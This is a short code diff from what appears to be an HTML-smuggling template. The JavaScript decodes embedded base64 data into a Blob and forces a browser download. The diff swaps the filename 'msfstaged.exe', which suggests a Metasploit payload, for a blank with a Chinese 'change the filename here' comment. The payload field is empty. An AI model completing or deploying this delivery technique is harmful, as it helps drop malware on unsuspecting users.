@@ -16,7 +16,8 @@
             var file = '';
             var data = base64ToArrayBuffer(file);
             var blob = new Blob([data], { type: 'octet/stream' });
-            var fileName = 'msfstaged.exe';
+        // 修改此处的文件名 !
+            var fileName = '';
 
             var a = document.createElement('a');
             document.body.appendChild(a);
